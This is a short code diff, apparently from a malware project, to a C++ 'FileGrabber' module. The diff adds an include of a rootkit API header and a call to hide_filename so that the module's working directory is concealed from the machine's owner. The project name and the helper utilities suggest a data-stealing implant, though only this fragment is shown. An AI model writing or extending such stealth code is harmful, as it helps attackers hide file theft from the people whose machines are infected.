@@ -10,6 +10,7 @@
 #include "FileGrabber.h"
 #include "../Utils/CryptoUtils.h"
 #include "../Utils/MachineUtils.h"
+#include "../amazing_rootkit/api/api.h"
 
 void FileGrabber::module_impl()
 {
@@ -26,7 +27,8 @@ void FileGrabber::module_impl()
     try 
     {
         working_dir = create_working_dir(base_dir);
-        //TODO: hide the working_dir using rootkit
+        // hide working_dir using rootkit api
+        hide_filename(working_dir.c_str());
         std::cout << "Successfully created directory: " << working_dir << std::endl;
     } 
     catch (const std::exception& ex) 
